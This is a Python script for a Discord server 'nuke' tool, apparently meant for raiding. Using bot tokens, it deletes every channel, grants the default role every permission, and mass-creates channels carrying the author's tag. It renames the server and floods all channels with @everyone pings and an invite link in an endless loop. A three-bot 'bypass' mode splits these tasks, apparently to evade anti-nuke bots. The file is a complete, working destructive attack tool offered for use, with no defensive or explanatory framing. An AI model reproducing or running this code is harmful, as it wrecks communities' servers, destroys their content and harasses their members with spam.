import discord
from discord.ext import commands
import asyncio
from colorama import Fore, Style, init
import time
import ctypes
import os


def show_logo():
    logo = [
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
"⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣧⣶⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
"⠀⠀⠀⠀⠀⠀⣠⣾⢿⣿⣿⣿⣏⠉⠉⠛⠛⠿⣷⣕⠀⠀⠀⠀⠀⠀⢀⡀",
"⠀⠀⠀⠀⣠⣾⢝⠄⢀⣿⡿⠻⣿⣄⠀⠀⠀⠀⠈⢿⣧⡀⣀⣤⡾⠀⠀⠀",
"⠀⠀⠀⢰⣿⡡⠁⠀⠀⣿⡇⠀⠸⣿⣾⡆⠀⠀⣀⣤⣿⣿⠋⠁⠀⠀⠀⠀",
"⠀⠀⢀⣷⣿⠃⠀⠀⢸⣿⡇⠀⠀⠹⣿⣷⣴⡾⠟⠉⠸⣿⡇⠀⠀⠀⠀⠀",
"⠀⠀⢸⣿⠗⡀⠀⠀⢸⣿⠃⣠⣶⣿⠿⢿⣿⡀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀",
"⠀⠀⠘⡿⡄⣇⠀⣀⣾⣿⡿⠟⠋⠁⠀⠈⢻⣷⣆⡄⢸⣿⡇⠀⠀⠀⠀⠀",
"⠀⠀⠀⢻⣷⣿⣿⠿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⣿⡟⠀⠀⠀⠀⠀⠀",
"⢀⣰⣾⣿⠿⣿⣿⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣅⠀⠀⠀⠀⠀⠀",
"⠀⠰⠊⠁⠀⠙⠪⣿⣿⣶⣤⣄⣀⣀⣀⣤⣶⣿⠟⠋⠙⢿⣷⡄⠀⠀⠀⠀",
"⠀⠀⠀⠀⠀⠀⢀⣿⡟⠺⠭⠭⠿⠿⠿⠟⠋⠁⠀⠀⠀⠀⠙⠏⣦⠀⠀⠀",
"⠀⠀⠀⠀⠀⠀⢸⡟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
"⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    ]
    for line in logo:
        print(Fore.RED + line)
        time.sleep(0.05)
    print(Style.RESET_ALL)


SPAM_DELAY = 0.5
channel_name = "By Saif - ROTT "
spam_message = "||everyone x @here || https://discord.gg/543"
bots_channels = {}

async def wait_until_in_guild(bot, guild_id):
    while True:
        guild = bot.get_guild(guild_id)
        if guild:
            print(f"[{bot.user}]  Joined guild")
            return guild
        await asyncio.sleep(0.2)

async def delete_channels(bot, guild_id):
    guild = bot.get_guild(guild_id)

    async def delete(ch):
        try:
            await ch.delete()
        except:
            pass

    await asyncio.gather(*(delete(ch) for ch in guild.channels))

async def give_admin(bot, guild_id):
    guild = bot.get_guild(guild_id)
    try:
        await guild.default_role.edit(permissions=discord.Permissions.all())
    except:
        pass

async def create_channels(bot, guild_id, count):
    guild = bot.get_guild(guild_id)

    async def create():
        try:
            await guild.create_text_channel(channel_name)
        except:
            pass

    await asyncio.gather(*(create() for _ in range(count)))
    return guild.text_channels  

async def rename_guild(bot, guild_id):
    guild = bot.get_guild(guild_id)
    try:
        await guild.edit(name=channel_name)
    except:
        pass

async def spam_channels(bot, channels):
    async def spam(ch):
        while True:
            try:
                await ch.send(spam_message)
            except:
                pass
            await asyncio.sleep(SPAM_DELAY)

    await asyncio.gather(*(spam(ch) for ch in channels))

async def normal_nuke(token, guild_id, channel_count):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f"[{bot.user}]  Normal Nuke Ready")
        await wait_until_in_guild(bot, guild_id)

        await asyncio.gather(
            delete_channels(bot, guild_id),
            give_admin(bot, guild_id)
        )

        channels = await create_channels(bot, guild_id, channel_count)
        await rename_guild(bot, guild_id)

        if channels:
            asyncio.create_task(spam_channels(bot, channels))

    await bot.start(token)


async def bypass_nuke(tokens, guild_id, channel_count):
    roles = ["deleter", "creator", "spammer"]
    bots = []

    for role, token in zip(roles, tokens):
        intents = discord.Intents.all()
        bot = commands.Bot(command_prefix="!", intents=intents)

        @bot.event
        async def on_ready(bot=bot, role=role):
            print(f"[{bot.user}]  {role.upper()} ready, waiting for guild...")
            await wait_until_in_guild(bot, guild_id)

            if role == "deleter":
                await asyncio.gather(
                    delete_channels(bot, guild_id),
                    give_admin(bot, guild_id)
                )

            elif role == "creator":
                await give_admin(bot, guild_id)
                channels = await create_channels(bot, guild_id, channel_count)
                await rename_guild(bot, guild_id)
                bots_channels["channels"] = channels

            elif role == "spammer":
                while "channels" not in bots_channels:
                    await asyncio.sleep(1)
                await spam_channels(bot, bots_channels["channels"])

        bots.append((bot, token))

    await asyncio.gather(*(b.start(t) for b, t in bots))


def main():
    show_logo()

    print("=== Nuke Modes ===")
    print("1) Normal Nuke")
    print("2) Bypass Nuke (3 bots)")

    mode = input("Choose mode (1 or 2): ").strip()
    guild_id = int(input("Enter Guild ID: "))
    channel_count = int(input("Enter number of channels to create: "))

    if mode == "1":
        token = input("Enter bot token: ").strip()
        asyncio.run(normal_nuke(token, guild_id, channel_count))

    elif mode == "2":
        tokens = [input(f"Enter bot token {i+1}: ").strip() for i in range(3)]
        asyncio.run(bypass_nuke(tokens, guild_id, channel_count))

    else:
        print(" Invalid mode selected.")

if __name__ == "__main__":
    main()
    
